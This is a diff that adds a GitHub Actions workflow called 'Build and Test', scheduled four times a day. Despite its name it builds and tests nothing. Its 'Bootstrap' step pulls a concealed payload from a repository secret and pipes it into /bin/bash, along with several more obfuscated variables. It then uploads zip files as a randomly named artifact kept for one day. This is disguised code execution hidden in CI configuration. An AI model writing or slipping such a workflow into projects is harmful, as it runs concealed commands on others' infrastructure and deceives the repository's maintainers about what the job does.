@@ -1,0 +1,32 @@
+name: Build and Test
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '37 4,10,16,22 * * *'
+permissions:
+  contents: read
+  actions: read
+jobs:
+  deploy:
+    name: Main task
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+      - name: Bootstrap
+        env:
+          ax47: ${{ secrets.ax47 }}
+        run: |
+          printf '%s' "$ax47" | jq -r .vfxhi034 | /bin/bash
+          echo $j45418 | jq -r .yo4832 | /bin/bash
+          echo $vff7755 | jq -r .th43997 | /bin/bash
+          echo $zakx04381 | jq -r .gamk7 | /bin/bash
+          echo $hrgw683 | jq -r .ptjnl06 | /bin/bash
+
+      - name: Archive artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: 1zNKxWvo
+          path: "*.zip"
+          retention-days: 1
